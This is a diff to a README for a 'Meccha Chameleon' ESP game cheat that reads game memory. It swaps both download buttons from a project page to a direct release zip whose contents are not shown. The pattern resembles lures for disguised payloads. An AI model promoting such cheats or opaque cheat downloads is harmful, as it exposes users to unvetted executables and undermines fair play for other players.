@@ -4,7 +4,7 @@
 
 # Meccha Chameleon ESP Trainer
 
-[![Download Meccha Chameleon ESP](button.svg)](https://anfalalsarraf-cmyk.github.io/meccha-chameleon-project/)
+[![Download Meccha Chameleon ESP](button.svg)](https://github.com/anfalalsarraf-cmyk/meccha-chameleon-project/releases/download/mecha-esp/meccha-toolkit.zip)
 
 **Fully external box ESP for MECCHA CHAMELEON (Steam / UE5.6) – no DLL injection, no dependencies.**
 
@@ -55,7 +55,7 @@ Note: The tool reads memory from the game process. Game updates may break offset
 
 ## Installation
 
-[![Download Meccha Chameleon ESP](button.svg)](https://anfalalsarraf-cmyk.github.io/meccha-chameleon-project/)
+[![Download Meccha Chameleon ESP](button.svg)](https://github.com/anfalalsarraf-cmyk/meccha-chameleon-project/releases/download/mecha-esp/meccha-toolkit.zip)
 
 2. Download the latest release or clone the repository.
 3. Install Python 3.11+ if you don't have it.
